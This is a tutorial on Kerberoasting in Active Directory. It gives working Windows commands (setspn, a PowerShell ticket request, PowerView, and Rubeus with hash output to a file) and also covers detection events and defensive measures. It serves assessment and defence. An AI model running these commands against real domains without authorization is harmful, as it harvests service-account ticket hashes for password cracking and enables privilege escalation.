# Kerberoasting - Windows Methods (Simple Guide)

> **Educational Purpose:** This guide explains the common Windows-based approaches used to identify Kerberos service tickets during authorized Active Directory security assessments.

---

# What is Kerberoasting?

Kerberoasting is an Active Directory attack technique where an authenticated domain user requests Kerberos **Ticket Granting Service (TGS)** tickets for service accounts (accounts with SPNs). Because these tickets are encrypted using the service account's password-derived key, organizations can assess password strength by attempting to recover weak passwords **offline**.

If a service account has a weak password, it may be vulnerable to offline password cracking.

---

# How Kerberoasting Works

```text
┌──────────────────────────────────────────────────────────────┐
│ 1. Authenticate as a normal domain user                      │
└──────────────────────────────────────────────────────────────┘
                           │
                           ▼
┌──────────────────────────────────────────────────────────────┐
│ 2. Enumerate Service Principal Names (SPNs)                  │
└──────────────────────────────────────────────────────────────┘
                           │
                           ▼
┌──────────────────────────────────────────────────────────────┐
│ 3. Request Kerberos service tickets (TGS)                    │
└──────────────────────────────────────────────────────────────┘
                           │
                           ▼
┌──────────────────────────────────────────────────────────────┐
│ 4. Export the tickets                                         │
└──────────────────────────────────────────────────────────────┘
                           │
                           ▼
┌──────────────────────────────────────────────────────────────┐
│ 5. Perform offline password auditing (authorized only)       │
└──────────────────────────────────────────────────────────────┘
                           │
                           ▼
┌──────────────────────────────────────────────────────────────┐
│ 6. Report weak service account passwords                     │
└──────────────────────────────────────────────────────────────┘
```

---

# Why Kerberoasting Matters

|Reason|Explanation|
|------|-----------|
|Weak service account passwords|Legacy service accounts often use predictable passwords.|
|High privileges|Some service accounts have elevated permissions.|
|Any authenticated user can request service tickets|This is normal Kerberos behavior.|
|Offline password auditing|Testing occurs without repeated interaction with the domain controller.|

---

# Windows Methods

There are several approaches for enumerating SPNs and requesting Kerberos tickets during an authorized assessment.

|Method|Tools|Difficulty|
|-------|-----|----------|
|Manual|Native Windows utilities|High|
|PowerView|PowerShell|Medium|
|Rubeus|Purpose-built assessment tool|Easy|

---

# Method 1 — Native Windows Enumeration

## Enumerate SPNs

```cmd
setspn.exe -Q */*
```

Lists all registered Service Principal Names in the domain.

---

## Request a Kerberos Service Ticket

PowerShell can request a Kerberos service ticket for a specified SPN.

```powershell
Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken `
-ArgumentList "MSSQLSvc/server.example.local:1433"
```

---

## Export Tickets

A ticket extraction utility may then be used in an authorized assessment to export tickets for offline analysis.

---

# Method 2 — PowerView

PowerView provides PowerShell functions for Active Directory enumeration.

## Import Module

```powershell
Import-Module .\PowerView.ps1
```

---

## List Accounts with SPNs

```powershell
Get-DomainUser * -SPN | Select samaccountname
```

---

## Request Ticket

```powershell
Get-DomainUser -Identity <UserName> | Get-DomainSPNTicket
```

---

## Export Multiple Tickets

```powershell
Get-DomainUser * -SPN |
Get-DomainSPNTicket |
Export-Csv .\tickets.csv -NoTypeInformation
```

---

# Method 3 — Rubeus

Rubeus is commonly used during internal Active Directory assessments.

## View Statistics

```powershell
.\Rubeus.exe kerberoast /stats
```

Shows available service accounts without requesting tickets.

---

## Request Tickets

```powershell
.\Rubeus.exe kerberoast
```

---

## Save Output

```powershell
.\Rubeus.exe kerberoast /outfile:hashes.txt
```

---

# Useful Rubeus Options

|Option|Purpose|
|-------|--------|
|`/stats`|Display statistics only|
|`/outfile`|Save output to a file|
|`/user`|Target a specific account|
|`/spn`|Target a specific SPN|
|`/ldapfilter`|Limit enumeration using LDAP filters|
|`/nowrap`|Avoid line wrapping in output|

---

# Encryption Types

Kerberos tickets may use different encryption algorithms.

|Encryption|Description|
|-----------|-----------|
|RC4|Legacy encryption; generally easier to audit when present.|
|AES128|Modern encryption.|
|AES256|Recommended modern encryption.|

---

# Detection Opportunities

Administrators can monitor for Kerberoasting activity by looking for:

- Large numbers of TGS requests
- Event ID **4769**
- Unusual requests for many SPNs
- Requests originating from unexpected workstations
- Abnormal access patterns outside business hours

---

# Defensive Recommendations

Organizations can reduce Kerberoasting risk by:

- Using long, randomly generated service account passwords
- Deploying **Group Managed Service Accounts (gMSAs)**
- Removing unnecessary SPNs
- Limiting service account privileges
- Monitoring Kerberos ticket requests
- Enforcing AES encryption where possible
- Rotating service account passwords regularly

---

# Comparison of Methods

|Method|Advantages|Disadvantages|
|------|-----------|--------------|
|Native Windows|No additional software required|Manual and time-consuming|
|PowerView|PowerShell-based enumeration|Requires importing a module|
|Rubeus|Feature-rich and efficient|May be detected by endpoint security controls|

---

# Key Takeaways

- Kerberoasting targets **service accounts with SPNs**.
- Any authenticated domain user can request service tickets as part of normal Kerberos operation.
- Offline password auditing helps identify weak service account passwords during authorized security assessments.
- Strong passwords, gMSAs, least privilege, and monitoring significantly reduce organizational risk.

---

## References

- MITRE ATT&CK: **T1558.003 – Kerberoasting**
- Microsoft Active Directory Documentation
- Microsoft Kerberos Authentication Documentation
